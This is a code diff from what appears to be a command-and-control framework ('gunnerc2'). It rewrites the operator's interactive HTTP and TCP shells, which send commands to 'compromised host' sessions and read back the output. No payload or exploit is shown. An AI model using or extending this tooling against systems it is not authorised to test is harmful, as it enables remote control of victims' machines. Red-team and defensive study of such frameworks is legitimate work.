@@ -45,305 +45,7 @@ def print_raw_progress(current, total, bar_width=40):
 	sys.stdout.write("\r" + bar)
 	sys.stdout.flush()
 
-'''def http_exec(sid, cmd, output=True, defender_bypass=False, op_id=False):
-	session = session_manager.sessions[sid]
-	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
-	meta = session.metadata
-	os_type = meta.get("os", "").lower()
-	out_b64 = None
-
-	if op_id:
-		logger.debug(f"SETTING OP ID TO: {op_id}")
-		session.merge_command_queue.setdefault(op_id, queue.Queue())
-		session.merge_response_queue.setdefault(op_id, queue.Queue())
-
-	else:
-		logger.debug("SETTING ID TO CONSOLE")
-		op_id = "console"
-		session.merge_command_queue.setdefault(op_id, queue.Queue())
-		session.merge_response_queue.setdefault(op_id, queue.Queue())
-
-	defender_state = defender.is_active
-
-	while not session.merge_response_queue[op_id].empty():
-		try:
-			session.merge_response_queue[op_id].get_nowait()
-
-		except queue.Empty:
-			break
-
-	"""while not session.output_queue.empty():
-		try:
-			session.output_queue.get_nowait()
-
-		except queue.Empty:
-			break"""
-
-	# === Session-Defender check ===
-	logger.debug("CHECKING IF SESSION DEFENDER IS ENABLED!!")
-	if defender_state and not defender_bypass:
-		if os_type in ("windows", "linux"):
-			if not defender.inspect_command(os_type, cmd):
-				print(brightred + "[!] Command blocked by Session-Defender.")
-				return None
-
-	logger.debug("ENCODING COMMAND")
-	b64_cmd = base64.b64encode(cmd.encode()).decode()
-
-	try:
-		#session.command_queue.put(b64_cmd)
-		if op_id:
-			logger.debug(f"SENDING COMMAND TO OPERATOR: {op_id}")
-			session.merge_command_queue[op_id].put(b64_cmd)
-
-		else:
-			logger.debug("SENDING COMMAND DOWN CONSOLE QUEUE")
-			session.merge_command_queue["console"].put(b64_cmd)
-
-	except Exception as e:
-		logger.debug(brightred + f"[!] ERROR failed to send command through the queue: {e}" + reset)
-
-	if output:
-		try:
-			#out_b64 = session.output_queue.get()
-			if op_id:
-				logger.debug(f"GRABBING RESPONSE FROM OPERATOR: {op_id}")
-				out_b64 = session.merge_response_queue[op_id].get()
-
-			else:
-				logger.debug("GRABBING RESPONSE FROM CONSOLE")
-				out_b64 = session.merge_response_queue["console"].get()
-
-		except Exception as e:
-			logger.debug(brightred + f"[!] ERROR failed to get command output from queue: {e}" + reset)
-
-	else:
-		try:
-			#out_b64 = session.output_queue.get_nowait()
-			if op_id:
-				out_b64 = session.merge_response_queue[op_id].get_nowait()
-
-			else:
-				out_b64 = session.merge_response_queue["console"].get_nowait()
-
-		except Exception as e:
-			logger.debug(brightred + f"[!] Failed to fetch output in a no wait manner!" + reset)
-
-
-	if out_b64 and output:
-		try:
-			return base64.b64decode(out_b64).decode("utf-8", "ignore").strip()
-
-		except Exception as e:
-			logger.debug(brightred + f"[!] ERROR failed to decode command output: {e}" + reset)
-
-	else:
-		return
-
-def tcp_exec(sid, cmd, timeout=0.5, defender_bypass=False, portscan_active=False, timeoutprint=True, retries=0, op_id="console"):
-	session = session_manager.sessions[sid]
-	meta = session.metadata
-	display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
-	client_socket = session.handler
-	os_type = meta.get("os", "").lower()
-	recv_lock = threading.Lock()
-
-	# ============================================================
-	# QUICK DRAIN: drop any stray bytes left over from a previous
-	# command, so they can't appear in our next read.
-	client_socket.settimeout(0.0)
-	client_socket.setblocking(False)
-	try:
-		while True:
-			with session.lock:
-				chunk = client_socket.recv(1024 * 2000)
-			if not chunk:
-				break
-	except (socket.timeout, BlockingIOError, OSError, ssl.SSLWantReadError, ssl.SSLWantWriteError):
-		pass
-
-	finally:
-		# put the timeout back for the real command
-		with session.lock:
-			client_socket.setblocking(True)
-			client_socket.settimeout(timeout)
-	# =============================================
-
-	if not op_id:
-		op_id = "console"
-	
-	# initialize the merge‐response map once
-	if not hasattr(session, "merge_response_queue"):
-		session.merge_response_queue = {}
-
-	session.merge_response_queue.setdefault(op_id, queue.Queue())
-
-	try:
-		defender_state = defender.is_active
-
-	except Exception as e:
-		print(brightred + f"[!] An unknown error ocurred!")
-
-	# === Session-Defender check ===
-	if defender_state and not defender_bypass:
-		if os_type in ("windows", "linux"):
-			if not defender.inspect_command(os_type, cmd):
-				print(brightred + "[!] Command blocked by Session-Defender.")
-				return None
-
-	start_tok = f"__OP__{op_id}__"   if op_id else None
-	end_tok   = f"__ENDOP__{op_id}__" if op_id else None
-
-	if op_id:
-		if "windows" in os_type:
-			# for a PowerShell-style Windows shell
-			wrapped = (
-				f'Write-Output "{start_tok}"; '
-				f"{cmd}; "
-				f'Write-Output "{end_tok}"'
-			)
-		else:
-			# for a Unix/bash shell
-			wrapped = f"echo {start_tok}; {cmd}; echo {end_tok}"
-		send_cmd = wrapped
-	else:
-		send_cmd = cmd
-
-	logger.debug(brightyellow + f"SET TCP CMD TO {send_cmd}")
-
-	try:
-		try:
-			with session.lock:
-				client_socket.sendall(send_cmd.encode() + b"\n")
-
-		except Exception as e:
-			print(brightred + f"[-] ERROR failed to send command over socket: {e}")
-		
-		with session.lock:
-			client_socket.settimeout(timeout)
-		chunks = []
-		got_any = False
-		attempt = 0
-
-		def _reader(op_id, session):
-			nonlocal got_any, attempt
-			while True:
-				try:
-					with session.recv_lock:
-						data = client_socket.recv(4096)
-				except socket.timeout:
-					# if portscan_active, retry until we get any data or hit max attempts
-					if portscan_active:
-						if not got_any:
-							if retries != 0:
-								if retries and attempt < retries:
-									attempt += 1
-									continue
-
-								# otherwise give up on reading
-								break
-							continue
-
-						else:
-							break
-
-					if not got_any:
-						# real timeout
-						if timeoutprint is True:
-							print(brightred + f"[!] Timeout waiting for response from agent {display}")
-							break
-
-						else:
-							break
-
-				# end of stream
-				if not data:
-					break
-
-				with session.recv_lock:
-					chunks.append(data)
-				got_any = True
-
-				# stop as soon as we see both markers in the joined buffer
-				joined = b"".join(chunks)
-				if op_id and start_tok.encode() in joined and end_tok.encode() in joined:
-					break
-
-			# 6) Once we exit the loop, optionally drain any residual bytes so the
-			#    next command doesn’t accidentally read this data.
-			with session.lock:
-				old_timeout = client_socket.gettimeout()
-				client_socket.setblocking(False)
-
-			try:
-				while True:
-					with session.lock:
-						if not client_socket.recv(1024 * 2000):
-							break
-			except BlockingIOError:
-				pass
-
-			finally:
-				with session.lock:
-					client_socket.setblocking(True)
-					client_socket.settimeout(old_timeout)
-
-		sleep(0.03)
-		
-		reader = threading.Thread(target=_reader, args=(op_id, session), daemon=True)
-		reader.start()
-		reader.join()   # block until either we hit EOF/timeout policy or markers arrived
-
-		# ─── Extract and stash ─────────────────────────────────────────────────
-		# pull out our slice
-		with session.recv_lock:
-			response_bytes = b"".join(chunks)
-			response = response_bytes.decode("utf-8", errors="ignore").strip()
-
-		for other_op, q in session.merge_response_queue.items():
-			if other_op == op_id:
-				continue
-
-			for mm in re.finditer(rf"__OP__{other_op}__\\s*(.*?)\\s*__ENDOP__{other_op}__", response, re.DOTALL):
-				q.put(mm.group(1))
-
-		logger.debug(brightyellow + f"GOT RESPONSE {response} TYPE {type(response)}")
-
-		# ─── now pull out *your* own slice (and clear your queue if it’s fresh) ───
-		logger.debug("RUNNING RE.SEARCH")
-		logger.debug(f"VERIFIED START TOK IS {start_tok} END TOK IS {end_tok}")
-		m = re.search(rf"{re.escape(start_tok)}\\s*(.*?)\\s*{re.escape(end_tok)}", response, re.DOTALL)
-
-		if m:
-			my_out = m.group(1)
-			# flush any stale items from *your* queue
-			try:
-				while True:
-					session.merge_response_queue[op_id].get_nowait()
-
-			except queue.Empty:
-				pass
-
-		else:
-			# fallback to whatever was queued for you (if anything)
-			try:
-				my_out = session.merge_response_queue[op_id].get_nowait()
-				
-			except queue.Empty:
-				logger.debug(f"No queued output for op {op_id}; empty result")
-				my_out = ""
-
-		logger.debug("ABOUT TO NORMALIZE OUTPUT")
-
-		# ─── Normalize & return ─────────────────────────────────────────────────
-		clean = utils.normalize_output(my_out.strip(), send_cmd)
-		return clean
-
-	except Exception as e:
-		return f"[!] Error: {e}"
-'''
-
-def interactive_http_shell(sid):
+"""def interactive_http_shell(sid):
 	session = session_manager.sessions[sid]
 	trans = session.transport
 	transport = trans.upper()
@@ -626,7 +328,250 @@ def interactive_tcp_shell(sid):
 		except FileNotFoundError:
 			pass
 
-		signal.signal(signal.SIGTSTP, orig_stp)
+		signal.signal(signal.SIGTSTP, orig_stp)"""
+
+def _session_display_name(sid: str) -> str:
+    return next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
+
+def _os_type_for(sid: str) -> str:
+    return session_manager.sessions[sid].metadata.get("os", "").lower()
+
+def interactive_http_shell(sid: str, op_id: str = "console", timeout: float | None = None):
+    """
+    Interactive shell for HTTP/HTTPS beacons using new CommandRouter via run_command_http.
+    Keeps readline history per-session and respects Session-Defender.
+    """
+    if sid not in session_manager.sessions:
+        print(brightred + f"[!] No such session {sid}")
+        return
+
+    session = session_manager.sessions[sid]
+    transport = (session.transport or "http").upper()
+    display = _session_display_name(sid)
+    os_type = _os_type_for(sid)
+
+    if os_type not in ("windows", "linux"):
+        print(brightred + f"[!] ERROR unsupported operating system on compromised host {display}")
+        return
+
+    defender_active = defender.is_active
+
+    # Per-session readline history file
+    session_hist = os.path.join(tempfile.gettempdir(), f"gunnerc2_http_{sid}.hist")
+    readline.write_history_file(HISTORY_FILE)
+    readline.clear_history()
+    try:
+        readline.read_history_file(session_hist)
+    except FileNotFoundError:
+        pass
+
+    # Trap Ctrl-Z to "background"
+    orig_stp = signal.getsignal(signal.SIGTSTP)
+    signal.signal(signal.SIGTSTP, lambda s, f: (_ for _ in ()).throw(EOFError))
+
+    try:
+        print(brightgreen + f"[*] Interactive {transport} shell with {display}. Type 'exit' to return.")
+
+        while True:
+            try:
+                cmd = input(brightblue + f"{display}> ").strip()
+            except EOFError:
+                # Ctrl-Z → ask to background
+                ans = input(brightgreen + f"\nBackground this {transport} shell? [y/N]: ").strip().lower()
+                if ans in ("y", "yes"):
+                    print(brightyellow + f"[*] Backgrounded {transport} shell {display}")
+                    break
+                else:
+                    continue
+            except KeyboardInterrupt:
+                print(brightyellow + "\n(Press Ctrl-Z to background, or type 'exit' to quit)")
+                continue
+
+            # Re-read OS type in case metadata changed
+            os_type = _os_type_for(sid)
+
+            # exit / bg handling
+            low = cmd.lower()
+            if low in ("exit", "quit"):
+                # Preserve your existing kill method for HTTP/HTTPS
+                if session_manager.kill_http_session(sid, os_type):
+                    print(brightyellow + f"[*] Killed {transport} session {display}")
+                else:
+                    print(brightred + f"[!] No such session {display}")
+                break
+
+            if low in ("bg", "background", "back"):
+                print(brightyellow + f"[*] Backgrounded {transport} session {display}")
+                break
+
+            if not cmd:
+                continue
+
+            # Session-Defender pre-check so operator sees immediate feedback
+            if defender_active:
+                try:
+                    if not defender.inspect_command(os_type, cmd):
+                        print(brightred + "[!] Command blocked by Session-Defender.")
+                        continue
+                except Exception:
+                    # If defender throws, fail open to avoid bricking console
+                    pass
+
+            # Execute through new core logic (router handles b64 & queues)
+            out = http_exec(
+                sid=sid,
+                cmd=cmd,
+                output=True,
+                defender_bypass=False,
+                op_id=op_id,
+                transfer_use=False,
+                timeout=timeout,
+            )
+
+            # run_command_http returns a decoded string or None on error/timeout
+            if out is None:
+                # Keep quiet on truly empty output; warn only when helpful
+                print(brightyellow + "[*] (No output / not ready)")  # optional
+            else:
+                # Router already normalizes output; just print it
+                if out.strip():
+                    print(out.rstrip())
+
+    finally:
+        # Restore history & SIGTSTP
+        readline.write_history_file(session_hist)
+        readline.clear_history()
+        try:
+            readline.read_history_file(HISTORY_FILE)
+        except FileNotFoundError:
+            pass
+        signal.signal(signal.SIGTSTP, orig_stp)
+
+
+def interactive_tcp_shell(sid: str, op_id: str = "console", timeout: float | None = None):
+    """
+    Interactive shell for TCP/TLS sessions via run_command_tcp (TcpCommandRouter).
+    Uses per-operator tokens and socket demux; no direct socket juggling here.
+    """
+    if sid not in session_manager.sessions:
+        print(brightred + f"[!] No such session {sid}")
+        return
+
+    session = session_manager.sessions[sid]
+    transport = (session.transport or "tcp").upper()
+    display = _session_display_name(sid)
+    os_type = _os_type_for(sid)
+
+    if os_type not in ("windows", "linux"):
+        print(brightred + f"[!] ERROR unsupported operating system on compromised host {display}")
+        return
+
+    defender_active = defender.is_active
+
+    # Default timeout from metadata if not provided
+    if timeout is None:
+        timeout = session.metadata.get("tcp_timeout", 0.5)
+
+    # Per-session readline history file
+    session_hist = os.path.join(tempfile.gettempdir(), f"gunnerc2_tcp_{sid}.hist")
+    readline.write_history_file(HISTORY_FILE)
+    readline.clear_history()
+    try:
+        readline.read_history_file(session_hist)
+    except FileNotFoundError:
+        pass
+
+    # Trap Ctrl-Z to "background"
+    orig_stp = signal.getsignal(signal.SIGTSTP)
+    signal.signal(signal.SIGTSTP, lambda s, f: (_ for _ in ()).throw(EOFError))
+
+    print(brightgreen + f"[*] Interactive {transport} shell with {display}. Type 'exit' to close.")
+
+    try:
+        while True:
+            try:
+                cmd = input(brightblue + f"{display}> ").strip()
+            except EOFError:
+                ans = input(brightgreen + "\nBackground this shell? [y/N]: ").strip().lower()
+                if ans in ("y", "yes"):
+                    print(brightyellow + f"[*] Backgrounded {transport} session {display}")
+                    break
+                else:
+                    continue
+            except KeyboardInterrupt:
+                print(brightyellow + "\n(Press Ctrl-Z to background, or type 'exit' to close)")
+                continue
+
+            # Re-read OS type in case metadata changed
+            os_type = _os_type_for(sid)
+
+            low = cmd.lower()
+            if low in ("exit", "quit"):
+                # Keep your previous close semantics for TCP/TLS
+                try:
+                    with session.lock:
+                        session.handler.close()
+                finally:
+                    # Remove from registry if present
+                    if sid in session_manager.sessions:
+                        del session_manager.sessions[sid]
+                print(brightyellow + f"[*] Closed {transport} session {display}")
+                break
+
+            if low in ("bg", "background", "back"):
+                print(brightyellow + f"[*] Backgrounded {transport} session {display}")
+                break
+
+            if not cmd:
+                continue
+
+            # Session-Defender pre-check for immediate feedback
+            if defender_active:
+                try:
+                    if not defender.inspect_command(os_type, cmd):
+                        print(brightred + "[!] Command blocked by Session-Defender.")
+                        continue
+                except Exception:
+                    pass
+
+            # Execute through new TCP core (tokens + demux handled inside)
+            try:
+                out = tcp_exec(
+                    sid=sid,
+                    cmd=cmd,
+                    timeout=timeout,
+                    defender_bypass=False,
+                    portscan_active=False,
+                    retries=0,
+                    op_id=op_id,
+                    transfer_use=False,
+                )
+            except Exception as e:
+                print(brightred + f"[!] Error: {e}")
+                # If socket is truly dead, clean up to match old behavior
+                try:
+                    with session.lock:
+                        session.handler.close()
+                except Exception:
+                    pass
+                if sid in session_manager.sessions:
+                    del session_manager.sessions[sid]
+                break
+
+            if out is None:
+                print(brightyellow + "[*] (No output / not ready)")  # optional
+            else:
+                if out.strip():
+                    print(out.rstrip())
+
+    finally:
+        readline.write_history_file(session_hist)
+        readline.clear_history()
+        try:
+            readline.read_history_file(HISTORY_FILE)
+        except FileNotFoundError:
+            pass
+        signal.signal(signal.SIGTSTP, orig_stp)
 
 ### 🧨 File download logic:
 
